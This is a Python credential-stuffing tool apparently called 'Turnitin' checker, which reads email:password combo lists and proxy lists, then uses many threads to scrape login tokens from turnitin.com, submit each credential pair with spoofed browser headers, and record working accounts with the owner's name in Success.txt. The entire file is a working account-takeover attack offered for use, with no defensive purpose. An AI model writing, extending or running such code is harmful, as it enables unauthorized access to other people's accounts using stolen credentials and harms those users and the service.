import os
import sys
import time
import queue
import random
import re
import threading
import httpx
import urllib.parse
from rich.console import Console
from rich.align import Align

console = Console()

ascii_art = [
    "   ████████╗██╗   ██╗██████╗ ███╗   ██╗██╗████████╗██╗███╗   ██╗",
    "   ╚══██╔══╝██║   ██║██╔══██╗████╗  ██║██║╚══██╔══╝██║████╗  ██║",
    "      ██║   ██║   ██║██████╔╝██╔██╗ ██║██║   ██║   ██║██╔██╗ ██║",
    "      ██║   ██║   ██║██╔══██╗██║╚██╗██║██║   ██║   ██║██║╚██╗██║",
    "      ██║   ╚██████╔╝██║  ██║██║ ╚████║██║   ██║   ██║██║ ╚████║",
    "      ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝   ╚═╝   ╚═╝╚═╝  ╚═══╝"
]

subtitle = "Made with ♥ By Sohail Syed"
stats = {"hits": 0, "checked": 0, "cpm": 0}
lock = threading.Lock()
combo_queue = queue.Queue()
results = []
start_time = time.time()

def center_text(text, width=70):
    pad = max(0, (width - len(text)) // 2)
    return " " * pad + text

def print_ascii():
    for line in ascii_art:
        colors = [31, 32, 33, 34, 35, 36, 37]
        colored_line = "".join(f"\033[{random.choice(colors)}m{c}\033[0m" if c.strip() else " " for c in line)
        print(center_text(colored_line))
    print(center_text(f"\033[1;37m{subtitle}\033[0m"))
    print()

def update_cpm():
    global stats
    elapsed = max(1, time.time() - start_time)
    with lock:
        stats["cpm"] = int(stats["checked"] * 60 / elapsed)

def show_stats_bar():
    with lock:
        hits = stats["hits"]
        checked = stats["checked"]
        cpm = stats["cpm"]
    console.print(Align.center(f"[bold cyan]Checked:[/bold cyan] {checked} | [bold green]Hits:[/bold green] {hits} | [bold yellow]CPM:[/bold yellow] {cpm}", width=80))

def load_file(title):
    while True:
        path = input(f"{title}: ").strip('"')
        if os.path.isfile(path):
            with open(path, encoding="utf-8", errors="ignore") as f:
                lines = [x.rstrip("\n") for x in f]
            return lines
        print("Invalid file, try again.")

def fix_proxy(line):
    if "@" in line or line.startswith("http://") or line.startswith("https://") or line.startswith("socks5://"):
        return line
    parts = line.replace(" ", "").split(":")
    if len(parts) == 4:
        ip, port, user, pw = parts
        return f"http://{user}:{pw}@{ip}:{port}"
    elif len(parts) == 2:
        ip, port = parts
        return f"http://{ip}:{port}"
    return None

def worker(proxies):
    proxy = random.choice(proxies) if proxies else None
    session = httpx.Client(follow_redirects=False, timeout=20, proxies=proxy, verify=False)
    while not combo_queue.empty():
        combo = combo_queue.get()
        email, pwd = combo.split(":", 1)
        try:
            r = session.get("https://www.turnitin.com/login_page.asp?lang=en_us", headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
                "Pragma": "no-cache",
                "Accept": "*/*"
            })
            login_id = re.search(r'name="login_id" type="hidden" value="([^"]+)"', r.text)
            login_token = re.search(r'name="login_token" type="hidden" value="([^"]+)"', r.text)
            if not (login_id and login_token):
                with lock:
                    stats["checked"] += 1
                continue
            US = urllib.parse.quote(email)
            PS = urllib.parse.quote(pwd)
            payload = f"javascript_enabled=0&email={US}&user_password={PS}&submit=Log+in&browser_fp=3d30615ac375685875f98ed1cb48557c&login_id={login_id.group(1)}&login_token={login_token.group(1)}"
            post = session.post("https://www.turnitin.com/login_page.asp?lang=en_us", headers={
                "Host": "www.turnitin.com",
                "Connection": "keep-alive",
                "Cache-Control": "max-age=0",
                "sec-ch-ua": '"Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"',
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": "\"Windows\"",
                "Origin": "https://www.turnitin.com",
                "Upgrade-Insecure-Requests": "1",
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-User": "?1",
                "Sec-Fetch-Dest": "document",
                "Referer": "https://www.turnitin.com/login_page.asp?lang=en_us",
                "Accept-Language": "en-US,en;q=0.9",
                "Accept-Encoding": "gzip, deflate"
            }, content=payload)
            loc = post.headers.get("Location", "")
            err_fail = "?err=3300&lang=en_us" in loc or "login_page.asp?err=3300&lang=en_us" in loc or "Login failed!" in post.text
            success = False
            if not err_fail and ("/do_login.asp" in loc or '<div id="greeting">' in post.text):
                success = True
            if success:
                # GET /do_login.asp
                if "/do_login.asp" in loc:
                    do_login = session.get(loc if loc.startswith("http") else f"https://www.turnitin.com{loc}", headers={
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
                    })
                    # Check for redirect to /s_home.asp and follow if present
                    if "Location" in do_login.headers:
                        next_loc = do_login.headers["Location"]
                        home_url = next_loc if next_loc.startswith("http") else f"https://www.turnitin.com{next_loc}"
                        session.get(home_url, headers={
                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
                        })
                # GET /user_info.asp for username
                userinfo = session.get("https://www.turnitin.com/user_info.asp", headers={
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
                })
                user_full = re.search(r'<a[^>]+class="user_full_name"[^>]*>(.*?)</a>', userinfo.text)
                username = user_full.group(1).strip() if user_full else "Unknown"
                out = f"{email}:{pwd} | Username: {username}"
                with lock:
                    stats["hits"] += 1
                    results.append(out)
                    with open("Success.txt", "a", encoding="utf-8") as f:
                        f.write(out + "\n")
                console.print(f"[bold green][HIT][/bold green] {out}")
            with lock:
                stats["checked"] += 1
        except Exception:
            with lock:
                stats["checked"] += 1
        combo_queue.task_done()

def main():
    print_ascii()
    combos = load_file("Drag & drop your Combo.txt")
    proxies = []
    p = input("Drag & drop your Proxy.txt (or just press enter for none): ").strip('"')
    if p and os.path.isfile(p):
        with open(p, encoding="utf-8", errors="ignore") as f:
            proxies = [fix_proxy(line.strip()) for line in f if fix_proxy(line.strip())]
    for c in combos:
        if ":" in c:
            combo_queue.put(c)
    tnum = input("How many bots/threads to use? (10-50): ")
    try:
        threads = max(10, min(50, int(tnum)))
    except:
        threads = 10
    threadlist = []
    for _ in range(threads):
        t = threading.Thread(target=worker, args=(proxies,))
        t.daemon = True
        t.start()
        threadlist.append(t)
    last_checked = 0
    while not combo_queue.empty():
        update_cpm()
        if stats["checked"] != last_checked:
            os.system("cls" if os.name == "nt" else "clear")
            print_ascii()
            show_stats_bar()
            last_checked = stats["checked"]
        time.sleep(0.5)
    for t in threadlist:
        t.join()
    update_cpm()
    os.system("cls" if os.name == "nt" else "clear")
    print_ascii()
    show_stats_bar()
    print("\n[bold magenta]Done. Hits saved to Success.txt[/bold magenta]")

if __name__ == "__main__":
    main()
